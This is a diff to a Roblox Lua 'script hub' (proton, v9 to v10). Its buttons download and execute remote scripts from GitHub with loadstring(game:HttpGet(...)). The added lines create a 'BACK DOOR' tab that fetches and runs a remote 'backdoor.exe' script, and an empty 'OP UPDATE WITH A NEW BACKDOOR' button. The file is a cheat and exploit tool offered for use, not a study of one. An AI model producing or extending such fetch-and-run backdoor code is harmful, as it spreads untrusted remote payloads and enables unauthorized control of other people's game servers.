@@ -1,6 +1,6 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/slf0Dev/Ocerium_Project/main/Library.lua"))()
 
-Window = Library.Main("proton_v9", "L") -- change "L" to the key that you want to hide the GUI
+Window = Library.Main("proton_v10", "L") -- change "L" to the key that you want to hide the GUI
 
 --//tab
 local Tab1 = Window.NewTab("PROTON HUB")
@@ -238,4 +238,25 @@ local Section = Tab.NewSection("piano games")
 --// Button
 local Button = Section.NewButton("auto piano player",function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/VBfHKC86WxpXyIgr/iwiwiejsaIwidi/main/iaowjdhd.lua", true))()
+end)
+
+--//tab
+local Tab = Window.NewTab("BACK DOOR")
+
+--//section
+local Section = Tab.NewSection("GOOFY")
+
+--// Button
+local Button = Section.NewButton("BACK DOOR SCRIPT",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
+end)
+
+--//tab
+local Tab = Window.NewTab("updates")
+
+--//section
+local Section = Tab.NewSection("updateV10")
+
+--// Button
+local Button = Section.NewButton("OP UPDATE WITH A NEW BACKDOOR",function()
 end)
